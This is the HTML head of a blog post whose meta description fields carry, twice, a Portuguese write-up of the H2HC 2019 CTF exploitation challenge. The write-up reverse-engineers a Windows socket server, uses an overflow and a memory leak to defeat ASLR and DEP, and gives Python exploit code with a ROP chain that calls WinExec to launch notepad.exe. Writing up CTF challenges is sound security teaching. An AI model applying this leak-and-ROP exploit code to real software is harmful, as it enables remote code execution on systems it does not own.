<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="[CTF - Writeup] Exploit H2HC 2019" /><meta name="author" content="Helvio Junior (m4v3r1ck)" /><meta property="og:locale" content="en_US" /><meta name="description" content="0x00 - Introdução Este ano (2019) tive o privilégio de participar da H2HC e durante a conferência teve um desafio CTF do qual eu participei com alguns amigos. O jogo começo com um desafio de engenharia reversa e outro de exploitation. Neste post iremos reproduzir passo a passo o processo de exploração deste exploit. 0x01 - Escopo Para este desafio nos foi entregue um binário, o mesmo disponível no link (h2hc_2019_ctf), com uma descrição &quot;Para o desafio de exploração o exploit deve funcionar no Windows 10 com full ASLR e outras mitigações habilitadas&quot;, sendo assim temos de montar um ambiente com Windows 10 atualizado e com as proteções de memória (ASLR e DEP) habilitadas. 0x02 - Enumeração Como qualquer exploração, uma das principais fases é a enumeração, então vamos lá. 0x0201 - Hashes [sourcecode language=&quot;shell&quot;]# md5sum h2hc.exe ca3c795f41b65cc298a87027869a111d h2hc.exe # sha1sum h2hc.exe 20976f919b8ca7430e73e51fbd826dc570fa03d2 h2hc.exe [/sourcecode] Utilizando o readpe do Kali podemos ver diversas informações da aplicação, abaixo segue o output de algumas partes, que extrairemos informações importantes. [sourcecode language=&quot;shell&quot;]# readpe --all h2hc.exe DOS Header Magic number: 0x5a4d (MZ) Bytes in last page: 144 Pages in file: 3 Relocations: 0 Size of header in paragraphs: 4 Minimum extra paragraphs: 0 Maximum extra paragraphs: 65535 Initial (relative) SS value: 0 Initial SP value: 0xb8 Initial IP value: 0 Initial (relative) CS value: 0 Address of relocation table: 0x40 Overlay number: 0 OEM identifier: 0 OEM information: 0 PE header offset: 0xe0 COFF/File header Machine: 0x8664 IMAGE_FILE_MACHINE_AMD64 Number of sections: 5 Date/time stamp: 1568413383 (Fri, 13 Sep 2019 22:23:03 UTC) Symbol Table offset: 0 Number of symbols: 0 Size of optional header: 0xf0 Characteristics: 0x22 Characteristics names IMAGE_FILE_EXECUTABLE_IMAGE IMAGE_FILE_LARGE_ADDRESS_AWARE Optional/Image header Magic number: 0x20b (PE32+) Linker major version: 10 Linker minor version: 0 Size of .text section: 0x8200 Size of .data section: 0x7c00 Size of .bss section: 0 Entrypoint: 0x1aa8 Address of .text section: 0x1000 ImageBase: 0x140000000 Alignment of sections: 0x1000 Alignment factor: 0x200 Major version of required OS: 5 Minor version of required OS: 2 Major version of image: 0 Minor version of image: 0 Major version of subsystem: 5 Minor version of subsystem: 2 Size of image: 0x14000 Size of headers: 0x400 Checksum: 0 Subsystem required: 0x3 (IMAGE_SUBSYSTEM_WINDOWS_CUI) DLL characteristics: 0x8140 DLL characteristics names IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE IMAGE_DLLCHARACTERISTICS_NX_COMPAT IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE Size of stack to reserve: 0x100000 Size of stack to commit: 0x1000 Size of heap space to reserve: 0x100000 Size of heap space to commit: 0x1000 ... Imported functions Library Name: KERNEL32.dll Functions Function Name: WinExec Function Name: GetCommandLineA ... Sections Section Name: .text Virtual Address: 0x1000 Physical Address: 0x8027 Size: 0x8200 (33280 bytes) Pointer To Data: 0x400 Relocations: 0 Characteristics: 0x60000020 Characteristic Names IMAGE_SCN_CNT_CODE IMAGE_SCN_MEM_EXECUTE IMAGE_SCN_MEM_READ [/sourcecode] Neste output algumas informações são importantes: ImageBase: 0x140000000 Address of .text section: 0x1000 Imported functions contains: WinExec 0x0202 - ROP Gadgets Como este exploit será com proteções de memória ASLR + DEP, inevitavelmente iremos utilizar a técnica de ROP, então ainda no Kali já vamos pegar os gadgets Utilizando a ferramenta ROP disponível em https://github.com/JonathanSalwan/ROPgadget podemos obter todos os endereços que utilizemos futuramente [sourcecode language=&quot;shell&quot;]# ROPgadget --binary h2hc.exe Gadgets information ============================================================ 0x000000014000567b : adc ah, bl ; add byte ptr [rax], al ; inc edx ; jmp 0x140005669 0x000000014000323b : adc al, 0 ; add byte ptr [rbp - 0x74f78b40], al ; retf 0x0000000140002276 : adc al, 0x48 ; add esp, 0x28 ; ret ... ... ... 0x00000001400036d7 : xor esi, dword ptr [rcx + rdx - 1] ; ret 0xff49 0x0000000140008c0f : xor rax, rax ; ret Unique gadgets found: 1048 [/sourcecode] Este comando nos retornou 1048 gadgets. 0x0203 - Interagindo com a aplicação Vamos então começar a brincadeira e interagir com a aplicação. Abrinda a aplicação no Windows podemos ver que a mesma realiza um bind na porta 54345 &nbsp; Podemos ver que há mensagens mostradas na console da aplicação 0x03 - Entendendo a aplicação Como vimos anteriormente a aplicação espera uma espécie de cabeçalho (header) para realizar a comunicação, sendo assim será necessário realizar a engenharia reversa da mesma, para esta tarefa utilizaremos a ferramenta Ghidra disponível em https://ghidra-sre.org/. Neste passo irei gastar um pouco mais de tempo para entendermos o fluxo da aplicação, fluxo este que determinará no sucesso do nosso overflow. Analisando o comportamento da aplicação podemos ver que ela imprime em tela algumas mensagens como &quot;Server listenning&quot;, Waiting for H2HC evil connections&quot;, sendo assim vamos começar procurando pela função que imprime essas mensagens. Na posição 140001520 encontramos essa função na qual detém o pseudocode conforma abaixo [sourcecode language=&quot;c&quot;] /* WARNING: Removing unreachable block (ram,0x000140001608) */ void FUN_140001520(undefined4 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4) { ulonglong uVar1; undefined *puVar2; longlong *plVar3; undefined4 local_res8 [8]; longlong local_48; undefined4 local_40 [2]; undefined local_38 [32]; longlong local_18; local_res8[0] = param_1; FUN_140001000((longlong)local_res8); uVar1 = FUN_1400010a0(); if ((int)uVar1 == 0) { FUN_1400011c0(s_[-]_Socket_support_version_error_14000d0c8,param_2,param_3,param_4); } else { plVar3 = &amp;amp;amp;amp;amp;amp;amp;local_48; puVar2 = (undefined *)0xd449; uVar1 = FUN_140001110(s_0.0.0.0_14000d0f0,0xd449,plVar3); if ((int)uVar1 != 0) { FUN_1400011c0(s_[+]_Server_listening_14000d128,puVar2,plVar3,param_4); do { while( true ) { FUN_1400011c0(s_[+]_Waiting_for_H2HC_evil_connec_14000d140,puVar2,plVar3,param_4); local_40[0] = 0x10; plVar3 = (longlong *)local_40; puVar2 = local_38; local_18 = FUN_140001210(local_48,puVar2,plVar3); if (local_18 != -1) break; FUN_1400011c0(s__[-]_Client_socket_error_14000d168,puVar2,plVar3,param_4); } FUN_1400011c0(s__[+]_New_connection_accepted_14000d188,puVar2,plVar3,param_4); FUN_140001480(local_18); FUN_1400011c0(s__[+]_Closing_connection_14000d1a8,puVar2,plVar3,param_4); FUN_140001300(local_18); } while( true ); } FUN_1400011c0(s_[-]_It_was_not_possible_to_bind:_14000d100,s_0.0.0.0_14000d0f8,0xd449,param_4); } FUN_140001050((longlong)local_res8); return; } [/sourcecode] Quando uma conexão é recebida a mesma é tratada pela função localizada na posição 140001480, aqui nomeada FUN_140001480. Que temos o seu pseudocode abaixo [sourcecode language=&quot;c&quot;]void FUN_140001480(undefined8 param_1) { uint uVar1; ulonglong uVar2; undefined8 uVar3; undefined8 uVar4; undefined8 local_res8 [4]; int local_10; uint local_c; local_res8[0] = param_1; FUN_140001000((longlong)local_res8); uVar4 = 0; uVar3 = 8; uVar1 = FUN_140001260(local_res8[0],&amp;amp;amp;amp;amp;amp;amp;local_10,8,0); uVar2 = (ulonglong)uVar1; FUN_1400011c0(s__[+]_Header_received:_%i_bytes_14000d068,uVar2,uVar3,uVar4); if (uVar1 == 8) { if (local_10 == 0x43483248) { FUN_140001380(local_res8[0],(ulonglong)local_c,uVar3,uVar4); } else { FUN_1400011c0(s__[-]_Error:_Invalid_cookie_14000d0a8,uVar2,uVar3,uVar4); } } else { FUN_1400011c0(s__[-]_Error:_Invalid_header_14000d088,uVar2,uVar3,uVar4); } FUN_140001050((longlong)local_res8); return; } [/sourcecode] &nbsp; Essa função recebe os dados que enviamos, separando um header de um body, tendo o header em local_10 e o body local_res8. A aplicação realiza as seguintes ações de checagem: Verifica se o header tem 8 bytes; Verifica se o header é igual a 0x43483248 que decodando o hexa chegamos ao texto H2HC; Caso ocorra as duas condições a função FUN_140001380 é chamada. Sendo assim nosso header deve conter 8 bytes, onde os 4 primeiros é o texto H2HC e os 4 bytes subsequentes é o tamanho do body enviado, conforme veremos abaixo. Segue abaixo o pseudocódigo da função FUN_140001380 [sourcecode language=&quot;c&quot;]void FUN_140001380(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4) { uint uVar1; ulonglong uVar2; undefined *puVar3; undefined8 uVar4; undefined8 local_res8; uint local_res10; undefined local_118 [252]; int local_1c; int local_18; local_res10 = (uint)param_2; local_18 = local_1c; local_res8 = param_1; FUN_140001000((longlong)&amp;amp;amp;amp;amp;amp;amp;local_res8); if (local_res10 &amp;amp;amp;amp;amp;amp;lt; 0x101) { uVar4 = 0; uVar2 = (ulonglong)(local_res10 + local_18); uVar1 = FUN_140001260(local_res8,local_118,local_res10 + local_18,0); FUN_1400011c0(s__[+]_Message_received:_%i_bytes_14000d000,(ulonglong)uVar1,uVar2,uVar4); puVar3 = local_118; sprintf(&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,s_[+]_H2HC19_message:_%s_14000d028); FUN_1400011c0(&amp;amp;amp;amp;amp;amp;amp;DAT_14000d040,&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,puVar3,uVar4); FUN_1400012b0(local_res8,&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,local_res10 + local_18,0); } else { FUN_1400011c0(s__[-]_Error:_Invalid_size_14000d048,param_2,param_3,param_4); } FUN_140001050((longlong)&amp;amp;amp;amp;amp;amp;amp;local_res8); return; } [/sourcecode] Essa é a função que realiza o tratamento do body enviado, nela podemos ver que uma das primeiras verificações é se o tamanho (que foi passado no header é menor que 0x101). Caso seja menor chama a função FUN_140001260 que na verdade é um alias para a função de socket que recebe os dados, posteriormente mostra a mensagem &quot;[+] Message received...&quot; em tela com o uso da função FUN_1400011c0, utiliza o sprintf para imprimir o texto recebido em tela, em seguida executa as funções FUN_1400011c0 e FUN_1400012b0. Em qualquer condição sempre executa a função FUN_140001050. De forma simples a função FUN_1400012b0 realiza o envio dos dados para o cliente via socket. Vamos dar uma pausa na análise do código para fazer uns testes e verificar se o que vimos realmente é o que acontece. Duas funções creio que seja melhor olharmos elas no debugger para ilustrar melhor o seu funcionamento. Função FUN_140001260 que realiza o recebimento dos dados via rede. Função FUN_1400012b0 que realiza o envio dos dados via rede 0x0301 - PoCs Vamos então tentar enviar a String H2HC seguido de um tamanho menor que o 0x0101 e um buffer. No exemplo abaixo fiz uma PoC passando como tamanho 5 bytes, mas enviando um buffer maior. Como visto a aplicação tratou os 5 bytes e retornou somente os primeiro 5 bytes da mensagem. Vamos agora tentar passar um tamanho maior que os 0x101. Podemos ver que não houve retorno por parte da aplicação e que na console da mesma foi apresentado um erro de tamanho inválido. Fazendo mais um teste vamos passar o valor máximo possível 0x100. Nessa condição podemos ver que ocorreu uma falha na aplicação. Mas não podemos nos empolgar, essa falha ainda não nos dá condição de execução de um código arbitrário. 0x0302 - Análise dinâmica até este ponto. Analisando um pouco mais a fundo podemos ver que na função FUN_140001050 temos a opção de manipular o endereço de retorno. Em um fluxo normal, onde passamos um tamanho de no máximo 0xff, temos o comportamento normal da aplicação Primeiramente é atribuído a EAX o valor que está no endereço de memória final e5b4 que corresponde ao hexa 0x04 Posteriormente atribui a RCX o valor da posição de memória final e5b8 cujo o seu valor é 0x00 E se utiliza desses 2 valores para cacular o endereço que posteriormente será usado como endereço de retorno da função FUN_140001380 que chamou essa função (FUN_140001050). E como podemos ver no topo da pilha no momento do ret da função FUN_140001380 está o endereço que foi calculado anteriormente, desta forma a aplicação chamará como proxima instrução este endereço. Quando passamos o valor 0x100 como tamanho podemos ver que o os valores em ...e5b4 e ...e5b8 são adulterados e consequentemente o endereço de retorno é alterado. O problema é que como esse (0x100) é o valor que podemos passar, não temos como fazer de forma direta uma substituição desses valores para que possamos efetivamente manipular o ret de forma que possamos passar valores de endereço válido. Após uma análise mais profunda e diversos testes encontrei que a vulnerabilidade pela qual é possível realizar o controle ro RET, é aliada com a que mostramos anteriormente, mas ela ocorre somente após o segundo envio de dados. Em uma tentativa de ilustrar melhor o que ocorre (antes de vermos o código da aplicação), a aplicação recebe os dados na pilha atual (no tamanho especificado pelo usuário até 0x100), mas para realizar isso realiza a soma 2 valores para definir esse tamanho que será recebido, a falha ocorre exatamente neste ponto. Um dos valores da soma é o que o usuário passou 0x00 até 0x0100) e o outro é ums posição de memória, o problema que essa posição de memória está 252 bytes (Hexa: 0xFC) a frente da posição de memória onde é salvo os dados recebidos do socket, como nós podemos gravar até 256 bytes (Hexa: 0x0100), podemos substituir esse valor do cálculo. Segue abaixo os prints das evidencias do teste Comandos sequenciais para evidenciar a falha Note o endereço para o qual serão enviados os dados (0xc7f5e0) bem como os dados que estão na pilha. Agora logo após a execução da função de recebimento dos dados. Agora executamos o segundo comando Observe agora os valores de RAX e RCX, onde RAX recebe o valor que está na posição 252 do nosso buffer, e o RCX recebe o valor 05, que foi o tamanho passado por mim, e a soma dos 2 vai ocorrer podendo assim extrapolar os 256 bytes de limite da aplicação. &nbsp; 0x0303 - Memory Address Leak. Para que possamos redirecionar o fluxo da aplicação para um endereço de POP POP RET ou outro qualquer que desejamos, se faz necessário conhecer o endereçamento atual da execução e como a aplicação e o Sistema Operacional estão com as proteções de memória Habilitadas (neste caso ASLR). Para que a aplicação nos envie os dados, ela faz um cálculo um pouco diferente, usando outras posições de memória, mas igualmente podendo serem manipuladas por nós. Segue abaixo as 2 linhas responsáveis por explorar a vulnerabilidade do leak. Observe que os registradores RAX e RCX receberam os dados desejados. Que posteriormente serão utilizados como terceiro parâmetro da função Send do Socket que por sua vez é o parâmetro que define o tamanho do buffer que será enviado Neste ponto vamos escrever nosso primeiro PoC do exploit. Neste exploit ainda não temos uma versão funcional do Leak, pois precisaremos realizar alguns ajustes para que o mesmo funcione corretamente (próximo assunto que abordaremos). Adicionalmente iremos utilizar a biblioteca pwnlib para nos facilitar no processo de exploit. 0x0303 - Retomada do fluxo. Para que a nossa aplicação nos retorno os dados se faz necessário ajustar nosso payload para que o endereço no topo da pilha (conforme vimos em 0x0302 - Análise dinâmica até este ponto). Abaixo temos o novo script, nele podemos observar que removi os últimos bytes do segundo payload para que tenhamos um endereço de retorno viável, pois com eles estavam sendo substituídos os endereços que a aplicação usa para controle. Ajustamos os ultimos 4 bytes para ser 0x040090000 de forma que o byte 0x04 é usado (dentro da função FUN_140001050) para ser o RAX que será posteriormente multiplicado a 8 e somado a um endereço para calcular o endereço que ficará como sendo o endereço no topo da pilha para ser usado no RET, sendo assim o endereço das próximas instruções da nossa aplicação. Segue abaixo a imagem do endereço calculado no topo da pilha. Mas temos que lembrar que este conjunto de 4 bytes são os usados como tamanho de retorno dos dados por parte da função send do socket (como cimos anteriormente). Sendo assim para que tenhamos o leak de diversos endereços que precisamos colocar no mínimo 2308 bytes (Hexa: 0x0904). Como resultado da execução podemos ver que tivemos um retorno de 0xa03 bytes, sendo que diversos deles são leaks de endereços da aplicação. Utilizando o trecho de código abaixo podemos capturar e tratar os dados recebidos a fim de extrair os endereços desejados. [sourcecode language=&quot;python&quot;]p1.recvuntil(&quot;H2HC19 message:&quot;) #Leak de um endereço no próprio fluxo de execução da aplicação (Sessão .text) p1.recv(0x10d) ld1 = p1.recv(8) leak_local_addr = u64(ld1.ljust(8, &quot;\x00&quot;)) base_addr = leak_local_addr &amp;amp;amp; 0xffffffffffff0000 log.info(&quot;Local leak : %s&quot; % hex(leak_local_addr)) log.info(&quot;App Base Addr : %s&quot; % hex(base_addr)) # Leak do endereço da função WinExec p1.recv(0x7f0) #offset entre a posição zero até o 90 f0 7e 0a fa 7f lead_data = p1.recv(8) p1.recv(4096) leak = u64(lead_data.ljust(8, &quot;\x00&quot;)) log.info(&quot;WinExec addr leak : %s&quot; % hex(leak)) [/sourcecode] Tendo como resultado abaixo Segue o código completo 0x04 - ROP - Controlando o fluxo da aplicação Uma vez que temos o endereço base da aplicação podemos utilizar nossos Gadgets para controlar o fluxo da aplicação Sendo assim temos como payload do terceiro estágio o trecho abaixo [sourcecode language=&quot;python&quot;]payload3 = &quot;H2HC&quot; #cookie payload3 += &quot;\x00\x01\x00\x00&quot; #size to trigger the vul payload3 += &quot;A&quot; * 0x100 payload3 += &quot;\x01\x01\x01\x01&quot; # Não pode ter nullbyte aqui payload3 += &quot;A&quot; * (8) # padding payload3 += p64(base_addr + 0x0464f) # NOP RET para saltar para depois do alinhamento payload3 += &quot;\x41&quot; * (4) # Alinhamento payload3 += &quot;\x42&quot; * (8) # Trash [/sourcecode] Ficando nosso exploit completo como abaixo 0x05 - WinExec x64 calling conventions Essa fase creio que foi uma das mais desafiadoras, pois tive que voltar aos livros (neste caso a web) e ler de forma detalhada a Convenção de chamada (Calling Conventions) disponível em https://docs.microsoft.com/pt-br/cpp/build/x64-calling-convention?view=vs-2019 Isso ocorre pois em 64bits há uma série de requisitos definidos na convenção de chamada que precisam ser cumpridos para que a aplicação (Chamada da função WinExec) funcione corretamente. Segue abaixo os requisitos: O Comando tem de estar a frente da posição da pilha (ou 128 bytes antes) no momento do call da WinExec, pois dentro da chamada da winexec ele utiliza alguns bytes anteriores a posição atual da stack, causando a substituição do nosso comando O Endereço do comando tem de estar alinhado a 16 bytes para saber se o endereço está alinhado basta realizar o calculo (endereço &amp; 0xfffffffffffffff0) O Endereço da pilha no momento da chamada do call da WinExec tem de estar alinhado a 16 bytes Na Pilha tem de ter o equivalente a 3 parâmetros como Shadow data (3 * 8 bytes) Na quarta posição da pilha tem de haver um endereço válido da aplicação (não é efetivamente usado mas dentro da WinExec ele cacula alguma coisa com este endereço e se for inválido da exception) Conforme a definição da Microsoft a função WinExec (https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec) necessita de 2 parâmetros [sourcecode language=&quot;c&quot;]UINT WinExec( LPCSTR lpCmdLine, UINT uCmdShow ); [/sourcecode] Onde: lpCmdLine é o comando a ser executado; uCmdShow como deve ser a visualização da aplicação filha. Este parâmetro acita diversos valores, mas os principais são: 0 - Hide, 3 - Maximize; 6 - Minimize; e 5 Show); Segundo a convenção de chamadas para 64bits devemos ter então as seguintes informações: RCX: Primeiro parâmetro da função (lpCmdLine); RDX: Segundo parâmetro da função (uCmdShow); Pilha: Shadow space; A nossa função (WinExec) exige os seguintes requisitos adicionais: Shadow space precisa ser de 24 bytes (3 * 8); Após os 24 bytes um endereço válido da aplicação. (Não entendi bem o porque, mas meu chute é que a função tenha alguma mitigação que verifique se o endereço de retorno é um endereço válido) 0x06 - ROP exploit final Utilizando os gadgets que pegamos no início deste tutorial, podemos calcular os dados de forma estratégica para montar os dados conforme os requisitos acima, ficando conforme e imagem abaixo Onde: R12 contém o endereço da função WinExec; RCX contém o parâmetro lpCmdLine, ou seja, endereço do comando a ser executado; RDX contém o parâmetro uCmdShow, ou seja, zero; Pilha (stack) contém 24 bytes de shadow space seguido de um endereço válido da aplicação; Ficando então este trecho de ROP conforme abaixo [sourcecode language=&quot;python&quot;]base_offset = 928 # esse offset calcula de forma que o apontamento chegue a primeira instrução do ROP Chain abaixo rop_chain2 = p64(leak) # WinExec --&amp;gt; Endereço que será chamado pelo call r12 rop_chain2 += p64(base_addr + 0x05c14) # add eax, r15d ; ret rop_chain2 += p64(base_addr + 0x0166a) # add esp, 0x28 ; ret --&amp;gt; Ajusta o alinhamento a 16 bytes rop_chain2 += &quot;\x41&quot; * 0x28 rop_chain2 += p64(base_addr + 0x0464f) # nop ; ret rop_chain2 += p64(base_addr + 0x06e1d) # mov rcx, rax ; call r12 rop_chain2 += &quot;\x00&quot; * (8*3) # Shadow Data rop_chain2 += p64(base_addr + 0x0464f) # NOP RET --&amp;gt; Será usado pela função WinExec rop_chain2 += &quot;\x00&quot; * (8*10) # Padding rop_chain2 += &quot;\x00&quot; * ((len(rop_chain2) + (8 * 4)) % 16) # Calcula simetria de 16 bytes rop_chain1 = p64(base_addr + 0x07cc8) # mov rax, r11 ; ret rop_chain1 += p64(base_addr + 0x04b59) # pop r15 ; pop r13 ; pop r12 ; ret rop_chain1 += p64(base_offset + len(rop_chain2) + (8 * 4)) # Numero a ser adicionado em rax rop_chain1 += &quot;\x41&quot; * 8 cmd = &quot;notepad.exe&quot; payload3 += rop_chain1 + rop_chain2 + cmd + &quot;\x00&quot; [/sourcecode] E tendo nosso código final funcional abaixo 0x06 - Agradecimentos Gostaria de agradecer aos amigos que jogaram comigo no CTF do H2HC, mesmo que não tenhamos conseguido resolver esse desafio de exploitation a tempo de pontuar no CTF, mas o desafio valeu a pena. Também gostaria de agradecer o Feroso pela troca de idéias e dicas durante o estudo deste exploit." /><meta property="og:description" content="0x00 - Introdução Este ano (2019) tive o privilégio de participar da H2HC e durante a conferência teve um desafio CTF do qual eu participei com alguns amigos. O jogo começo com um desafio de engenharia reversa e outro de exploitation. Neste post iremos reproduzir passo a passo o processo de exploração deste exploit. 0x01 - Escopo Para este desafio nos foi entregue um binário, o mesmo disponível no link (h2hc_2019_ctf), com uma descrição &quot;Para o desafio de exploração o exploit deve funcionar no Windows 10 com full ASLR e outras mitigações habilitadas&quot;, sendo assim temos de montar um ambiente com Windows 10 atualizado e com as proteções de memória (ASLR e DEP) habilitadas. 0x02 - Enumeração Como qualquer exploração, uma das principais fases é a enumeração, então vamos lá. 0x0201 - Hashes [sourcecode language=&quot;shell&quot;]# md5sum h2hc.exe ca3c795f41b65cc298a87027869a111d h2hc.exe # sha1sum h2hc.exe 20976f919b8ca7430e73e51fbd826dc570fa03d2 h2hc.exe [/sourcecode] Utilizando o readpe do Kali podemos ver diversas informações da aplicação, abaixo segue o output de algumas partes, que extrairemos informações importantes. [sourcecode language=&quot;shell&quot;]# readpe --all h2hc.exe DOS Header Magic number: 0x5a4d (MZ) Bytes in last page: 144 Pages in file: 3 Relocations: 0 Size of header in paragraphs: 4 Minimum extra paragraphs: 0 Maximum extra paragraphs: 65535 Initial (relative) SS value: 0 Initial SP value: 0xb8 Initial IP value: 0 Initial (relative) CS value: 0 Address of relocation table: 0x40 Overlay number: 0 OEM identifier: 0 OEM information: 0 PE header offset: 0xe0 COFF/File header Machine: 0x8664 IMAGE_FILE_MACHINE_AMD64 Number of sections: 5 Date/time stamp: 1568413383 (Fri, 13 Sep 2019 22:23:03 UTC) Symbol Table offset: 0 Number of symbols: 0 Size of optional header: 0xf0 Characteristics: 0x22 Characteristics names IMAGE_FILE_EXECUTABLE_IMAGE IMAGE_FILE_LARGE_ADDRESS_AWARE Optional/Image header Magic number: 0x20b (PE32+) Linker major version: 10 Linker minor version: 0 Size of .text section: 0x8200 Size of .data section: 0x7c00 Size of .bss section: 0 Entrypoint: 0x1aa8 Address of .text section: 0x1000 ImageBase: 0x140000000 Alignment of sections: 0x1000 Alignment factor: 0x200 Major version of required OS: 5 Minor version of required OS: 2 Major version of image: 0 Minor version of image: 0 Major version of subsystem: 5 Minor version of subsystem: 2 Size of image: 0x14000 Size of headers: 0x400 Checksum: 0 Subsystem required: 0x3 (IMAGE_SUBSYSTEM_WINDOWS_CUI) DLL characteristics: 0x8140 DLL characteristics names IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE IMAGE_DLLCHARACTERISTICS_NX_COMPAT IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE Size of stack to reserve: 0x100000 Size of stack to commit: 0x1000 Size of heap space to reserve: 0x100000 Size of heap space to commit: 0x1000 ... Imported functions Library Name: KERNEL32.dll Functions Function Name: WinExec Function Name: GetCommandLineA ... Sections Section Name: .text Virtual Address: 0x1000 Physical Address: 0x8027 Size: 0x8200 (33280 bytes) Pointer To Data: 0x400 Relocations: 0 Characteristics: 0x60000020 Characteristic Names IMAGE_SCN_CNT_CODE IMAGE_SCN_MEM_EXECUTE IMAGE_SCN_MEM_READ [/sourcecode] Neste output algumas informações são importantes: ImageBase: 0x140000000 Address of .text section: 0x1000 Imported functions contains: WinExec 0x0202 - ROP Gadgets Como este exploit será com proteções de memória ASLR + DEP, inevitavelmente iremos utilizar a técnica de ROP, então ainda no Kali já vamos pegar os gadgets Utilizando a ferramenta ROP disponível em https://github.com/JonathanSalwan/ROPgadget podemos obter todos os endereços que utilizemos futuramente [sourcecode language=&quot;shell&quot;]# ROPgadget --binary h2hc.exe Gadgets information ============================================================ 0x000000014000567b : adc ah, bl ; add byte ptr [rax], al ; inc edx ; jmp 0x140005669 0x000000014000323b : adc al, 0 ; add byte ptr [rbp - 0x74f78b40], al ; retf 0x0000000140002276 : adc al, 0x48 ; add esp, 0x28 ; ret ... ... ... 0x00000001400036d7 : xor esi, dword ptr [rcx + rdx - 1] ; ret 0xff49 0x0000000140008c0f : xor rax, rax ; ret Unique gadgets found: 1048 [/sourcecode] Este comando nos retornou 1048 gadgets. 0x0203 - Interagindo com a aplicação Vamos então começar a brincadeira e interagir com a aplicação. Abrinda a aplicação no Windows podemos ver que a mesma realiza um bind na porta 54345 &nbsp; Podemos ver que há mensagens mostradas na console da aplicação 0x03 - Entendendo a aplicação Como vimos anteriormente a aplicação espera uma espécie de cabeçalho (header) para realizar a comunicação, sendo assim será necessário realizar a engenharia reversa da mesma, para esta tarefa utilizaremos a ferramenta Ghidra disponível em https://ghidra-sre.org/. Neste passo irei gastar um pouco mais de tempo para entendermos o fluxo da aplicação, fluxo este que determinará no sucesso do nosso overflow. Analisando o comportamento da aplicação podemos ver que ela imprime em tela algumas mensagens como &quot;Server listenning&quot;, Waiting for H2HC evil connections&quot;, sendo assim vamos começar procurando pela função que imprime essas mensagens. Na posição 140001520 encontramos essa função na qual detém o pseudocode conforma abaixo [sourcecode language=&quot;c&quot;] /* WARNING: Removing unreachable block (ram,0x000140001608) */ void FUN_140001520(undefined4 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4) { ulonglong uVar1; undefined *puVar2; longlong *plVar3; undefined4 local_res8 [8]; longlong local_48; undefined4 local_40 [2]; undefined local_38 [32]; longlong local_18; local_res8[0] = param_1; FUN_140001000((longlong)local_res8); uVar1 = FUN_1400010a0(); if ((int)uVar1 == 0) { FUN_1400011c0(s_[-]_Socket_support_version_error_14000d0c8,param_2,param_3,param_4); } else { plVar3 = &amp;amp;amp;amp;amp;amp;amp;local_48; puVar2 = (undefined *)0xd449; uVar1 = FUN_140001110(s_0.0.0.0_14000d0f0,0xd449,plVar3); if ((int)uVar1 != 0) { FUN_1400011c0(s_[+]_Server_listening_14000d128,puVar2,plVar3,param_4); do { while( true ) { FUN_1400011c0(s_[+]_Waiting_for_H2HC_evil_connec_14000d140,puVar2,plVar3,param_4); local_40[0] = 0x10; plVar3 = (longlong *)local_40; puVar2 = local_38; local_18 = FUN_140001210(local_48,puVar2,plVar3); if (local_18 != -1) break; FUN_1400011c0(s__[-]_Client_socket_error_14000d168,puVar2,plVar3,param_4); } FUN_1400011c0(s__[+]_New_connection_accepted_14000d188,puVar2,plVar3,param_4); FUN_140001480(local_18); FUN_1400011c0(s__[+]_Closing_connection_14000d1a8,puVar2,plVar3,param_4); FUN_140001300(local_18); } while( true ); } FUN_1400011c0(s_[-]_It_was_not_possible_to_bind:_14000d100,s_0.0.0.0_14000d0f8,0xd449,param_4); } FUN_140001050((longlong)local_res8); return; } [/sourcecode] Quando uma conexão é recebida a mesma é tratada pela função localizada na posição 140001480, aqui nomeada FUN_140001480. Que temos o seu pseudocode abaixo [sourcecode language=&quot;c&quot;]void FUN_140001480(undefined8 param_1) { uint uVar1; ulonglong uVar2; undefined8 uVar3; undefined8 uVar4; undefined8 local_res8 [4]; int local_10; uint local_c; local_res8[0] = param_1; FUN_140001000((longlong)local_res8); uVar4 = 0; uVar3 = 8; uVar1 = FUN_140001260(local_res8[0],&amp;amp;amp;amp;amp;amp;amp;local_10,8,0); uVar2 = (ulonglong)uVar1; FUN_1400011c0(s__[+]_Header_received:_%i_bytes_14000d068,uVar2,uVar3,uVar4); if (uVar1 == 8) { if (local_10 == 0x43483248) { FUN_140001380(local_res8[0],(ulonglong)local_c,uVar3,uVar4); } else { FUN_1400011c0(s__[-]_Error:_Invalid_cookie_14000d0a8,uVar2,uVar3,uVar4); } } else { FUN_1400011c0(s__[-]_Error:_Invalid_header_14000d088,uVar2,uVar3,uVar4); } FUN_140001050((longlong)local_res8); return; } [/sourcecode] &nbsp; Essa função recebe os dados que enviamos, separando um header de um body, tendo o header em local_10 e o body local_res8. A aplicação realiza as seguintes ações de checagem: Verifica se o header tem 8 bytes; Verifica se o header é igual a 0x43483248 que decodando o hexa chegamos ao texto H2HC; Caso ocorra as duas condições a função FUN_140001380 é chamada. Sendo assim nosso header deve conter 8 bytes, onde os 4 primeiros é o texto H2HC e os 4 bytes subsequentes é o tamanho do body enviado, conforme veremos abaixo. Segue abaixo o pseudocódigo da função FUN_140001380 [sourcecode language=&quot;c&quot;]void FUN_140001380(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4) { uint uVar1; ulonglong uVar2; undefined *puVar3; undefined8 uVar4; undefined8 local_res8; uint local_res10; undefined local_118 [252]; int local_1c; int local_18; local_res10 = (uint)param_2; local_18 = local_1c; local_res8 = param_1; FUN_140001000((longlong)&amp;amp;amp;amp;amp;amp;amp;local_res8); if (local_res10 &amp;amp;amp;amp;amp;amp;lt; 0x101) { uVar4 = 0; uVar2 = (ulonglong)(local_res10 + local_18); uVar1 = FUN_140001260(local_res8,local_118,local_res10 + local_18,0); 